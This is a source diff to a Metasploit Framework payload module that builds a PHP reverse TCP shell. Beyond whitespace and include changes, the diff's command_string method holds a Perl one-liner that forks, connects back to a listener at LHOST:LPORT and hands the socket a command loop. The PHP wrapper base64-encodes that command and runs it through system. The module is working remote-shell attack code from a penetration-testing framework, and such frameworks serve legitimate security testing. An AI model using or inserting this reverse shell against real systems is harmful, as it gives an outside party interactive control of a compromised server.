@@ -3,23 +3,23 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/payload/php'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
 	include Msf::Payload::Php
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -49,14 +49,16 @@ module Metasploit3
 		buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
 		buf += "#{php_system_block({:cmd_varname=>"$c"})}"
 		return super + buf
-			
+
 	end
-	
+
 	#
 	# Returns the command string to use for execution
 	#
 	def command_string
-		cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+		cmd = "perl -MIO -e '$p=fork;exit,if($p);" +
+			"$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");" +
+			"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
 
 end
